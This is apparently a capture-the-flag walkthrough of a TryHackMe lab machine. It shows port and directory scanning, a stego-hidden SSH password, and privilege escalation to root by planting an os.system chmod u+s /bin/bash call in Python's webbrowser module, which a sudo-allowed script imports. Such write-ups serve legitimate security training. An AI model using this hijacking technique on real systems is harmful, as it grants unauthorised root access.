# Nmap
```bash
# Nmap 7.91 scan initiated Fri Jun 11 17:59:34 2021 as: nmap -T5 -p- -sCV --min-rate 25000 -oN nmap/alnmap.txt --vv 10.10.41.156
Warning: 10.10.41.156 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.41.156
Host is up, received timestamp-reply ttl 61 (2.1s latency).
Scanned at 2021-06-11 17:59:35 IST for 40s
Not shown: 48831 filtered ports, 16702 closed ports
Reason: 48831 no-responses and 16702 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inceptive Agents Area
1111/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 82:e7:23:04:43:cf:8f:cd:39:70:32:8e:7c:f2:cc:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNH7tWcp5ubWrGzcw3720EZRXSSfxHLe2XQ5Q5g22lso/+APY1j2T65rogbBvhQx8Ck40oeGGyXYqF3QmUHZ3JXUeaqGrK0BEWD1HiFY7dlLkkmNwXhON/lWD9MDkzpkgngPtQdmaJKhgn2AYhDIAIdcV50azrd77mwZ2HvyhO/WaJSYmuHPV/9uhe5b8wja0LjuRmqWAMIv20gHflJPEdoTRl6iZKAPDxfRx6r2yrOniYA6AxMyb86cmTlarlDfLTGcMvbbI4jLCzH8PUvOjz5W7K0A+Va9lmgKDVvIhly7DjM8DIOGCjUOewSr+K7eoPu6vTB2rRoi5grlQi7zQnBo7ii5CS6SFKjUeFluy1qpKcXN3k0yB4uo7Zv/yHM2SiusQxsH/h3fReW6hFQ5f3qh9XgAHvUavWk7g1LPxhU4I52S2c9vLDmIy6r4krNtXl/5Enyig2j6SHDLPh49MJy3T6GeJz2nVpFjI/+brxMUTFoNxuGVnGcowt2qBSY/M=
|   256 d9:25:7a:e4:c8:0d:a2:32:47:5c:bc:cb:0f:b5:f3:c8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGCmZ5WvBCs045CJIYv3ZgCedpvfysIPNGV3podWjeibqOPeY8uWd/50Vt6N7ey1M12xz6WChevz3GpXsyeUAUs=
|   256 d7:ee:6e:f8:4c:98:43:c8:ae:94:8e:77:81:97:07:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO0+Cu6N1hdueSuiQZMl+fYDsstNL8dqQy5wqtzKoCXf
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 18:00:15 2021 -- 1 IP address (1 host up) scanned in 40.66 seconds
```

![[Pasted image 20210611183539.png]]

![[Pasted image 20210611183621.png]]

```bash
/dr34m3rs
```

![[Pasted image 20210611183701.png]]

![[Pasted image 20210611183735.png]]

![[Pasted image 20210611184147.png]]

![](https://i.imgur.com/vQgF9N7.png)


```bash
ch3ck_1n
```


![[Pasted image 20210611183752.png]]

```bash
http://10.10.41.156/drunk3n/
```

![[Pasted image 20210611191558.png]]

![](https://i.imgur.com/bfIX7XJ.png)

The file upload is a rabbit hole we can't Get anything from there so lets try to FUZZ

```bash
╭─root@kali ~/Desktop/thm/DREAMSTER ‹master*›                                                                                                                            
╰─# ffuf -w /usr/share/wordlists/dirb/big.txt   -u http://10.10.255.188/drunk3n/FUZZ -e .phtml,.aspx,.cgi | tee ffuf/ffuf.out                                            
                                                                                                                                                                         
        /'___\  /'___\           /'___\                                                                                                                                  
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                  
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                 
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                  
          \/_/    \/_/   \/___/    \/_/                                                                                                                                  
                                                                                                                                                                         
       v1.3.1 Kali Exclusive <3                                                                                                                                          
________________________________________________                                                                                                                         

 :: Method           : GET
 :: URL              : http://10.10.255.188/drunk3n/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .phtml .aspx .cgi 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.phtml         [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.cgi           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd.phtml         [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd.cgi           [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess.aspx          [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd.aspx          [Status: 403, Size: 278, Words: 20, Lines: 10]
ztest                   [Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: [81876/81876] :: Job [1/1] :: 98 req/sec :: Duration: [0:13:51] :: Errors: 0 ::
```

![](https://i.imgur.com/bng5YFR.png)

```bash
http://10.10.255.188/d1sc0/
```

```bash
password stego : passphrase
```

```bash
╭─root@kali ~/Desktop/thm/DREAMSTER ‹master*› 
╰─# steghide extract -sf dog_boy.jpg                                                                                                                                 1 ↵
Enter passphrase: 
wrote extracted data to "loot.txt".
╭─root@kali ~/Desktop/thm/DREAMSTER ‹master*› 
╰─# cat loot.txt                             
dear ripper,
        
           i hope the dreamers wont make to here...hope you will be reading this...
           with all respect delete ur god damn passowrd.."ripperthegolddicker"....you know the port 1111 will provide communication through ssh...damn youuu..

cheers,
     agent root
```

Got ssh as ripper 

```bash
user : ripper
pass : ripperthegolddicker
```
```bash
╭─root@kali ~/Desktop/thm/DREAMSTER ‹master*›                                                                                                                            
╰─# ssh ripper@10.10.11.37 -p 1111                                                                                                                                       
ripper@10.10.11.37's password:                                                                                                                                           
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)                                                                                                        
                                                                                                                                                                         
 * Documentation:  https://help.ubuntu.com                                                                                                                               
 * Management:     https://landscape.canonical.com                                                                                                                       
 * Support:        https://ubuntu.com/advantage                                                                                                                          
                                                                                                                                                                         
  System information as of Tue 15 Jun 2021 06:13:59 PM UTC                                                                                                               
                                                                                                                                                                         
  System load:  0.0                Processes:             109                                                                                                            
  Usage of /:   23.0% of 19.56GB   Users logged in:       0                                                                                                              
  Memory usage: 46%                IPv4 address for eth0: 10.10.11.37                                                                                                    
  Swap usage:   0%                                                                                                                                                       
                                                                                                                                                                         
                                                                                                                                                                         
67 updates can be installed immediately.                                                                                                                                 
1 of these updates is a security update.                                                                                                                                 
To see these additional updates run: apt list --upgradable


Last login: Thu Jun 10 09:03:56 2021 from 192.168.211.129
ripper@pawner:~$ whoami
ripper
ripper@pawner:~$ id
uid=1000(ripper) gid=1000(ripper) groups=1000(ripper),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
ripper@pawner:~$ 
`````

## User flag
```bash
ripper@pawner:~$ cd /var
ripper@pawner:/var$ ls -la
total 60
drwxr-xr-x 14 root root   4096 Jun 10 06:51 .
drwxr-xr-x 20 root root   4096 Jun  8 15:53 ..
drwxr-xr-x  2 root root   4096 Jun 15 19:24 backups
drwxr-xr-x 14 root root   4096 Jun  9 18:13 cache
-rw-r--r--  1 root root     88 Jun 10 06:51 .ch3ck_1s_0n.txt
drwxrwxrwt  2 root root   4096 Feb  1 17:28 crash
drwxr-xr-x 42 root root   4096 Jun 10 09:32 lib
drwxrwsr-x  2 root staff  4096 Apr 15  2020 local
lrwxrwxrwx  1 root root      9 Feb  1 17:20 lock -> /run/lock
drwxrwxr-x 11 root syslog 4096 Jun 15 19:21 log
drwxrwsr-x  2 root mail   4096 Feb  1 17:20 mail
drwxr-xr-x  3 root root   4096 Jun  9 08:30 opt
lrwxrwxrwx  1 root root      4 Feb  1 17:20 run -> /run
drwxr-xr-x  5 root root   4096 Feb  1 17:29 snap
drwxr-xr-x  4 root root   4096 Feb  1 17:22 spool
drwxrwxrwt  7 root root   4096 Jun 15 19:21 tmp
drwxr-xr-x  3 root root   4096 Jun  8 16:12 www
ripper@pawner:/var$ cat .ch3ck_1s_0n.txt

Hehe...there you go dreamers...here is your user flag

THM{st********************************g0}

```
# Root
```bash
ripper@pawner:~$ sudo -l
Matching Defaults entries for ripper on pawner:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ripper may run the following commands on pawner:
    (root) NOPASSWD: /usr/bin/python3.8 /var/opt/rose/1_2/talk.py
ripper@pawner:~$ 
```

Let's check the python file..............

```bash
ripper@pawner:~$ cat /var/opt/rose/1_2/talk.py

import webbrowser

webbrowser.open("https://google.com")
ripper@pawner:~$ 
```

So it is  [Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

# Exploit 
```bash
ripper@pawner:~$ locate webbrowser
/snap/core18/1944/usr/lib/python3.6/webbrowser.py
/snap/core18/1944/usr/lib/python3.6/__pycache__/webbrowser.cpython-36.pyc
/snap/core18/2066/usr/lib/python3.6/webbrowser.py
/snap/core18/2066/usr/lib/python3.6/__pycache__/webbrowser.cpython-36.pyc
/snap/lxd/19188/lib/python2.7/webbrowser.py
/snap/lxd/20326/lib/python2.7/webbrowser.py
/usr/lib/python3.8/webbrowser.py
/usr/lib/python3.8/__pycache__/webbrowser.cpython-38.pyc
```
 ![](https://i.imgur.com/RrqSJtA.png)

so lets add python command to give suid permission for bash

```bash
nano /usr/lib/python3.8/webbrowser.py
```

![](https://i.imgur.com/i8FIW4W.png)

```bash
os.system("chmod u+s /bin/bash")
```

Executing the command...
```bash
sudo /usr/bin/python3.8 /var/opt/rose/1_2/talk.py
```

![](https://i.imgur.com/fK5gccm.png)

```bash
bash-5.0# cd /root
bash-5.0# ls -la
total 52
drwx------  6 root root 4096 Jun 10 08:45 .
drwxr-xr-x 20 root root 4096 Jun  8 15:53 ..
-rw-------  1 root root 2412 Jun 10 08:50 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jun  9 17:53 .cache
-rw-r--r--  1 root root  131 Jun 10 07:07 .ch3ck_m4t3.txt
drwxr-xr-x  3 root root 4096 Jun  9 08:12 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwxr-xr-x  3 root root 4096 Jun  8 16:09 snap
drwx------  2 root root 4096 Jun  8 16:09 .ssh
-rw-------  1 root root 8281 Jun 10 08:45 .viminfo
bash-5.0# cat .ch3ck_m4t3.txt
congooooooooooooooooooooo.............


here is ur root flag

RTHM{**************************}

created by rockybai and 7h3h4ckv1s7
bash-5.0# 
```
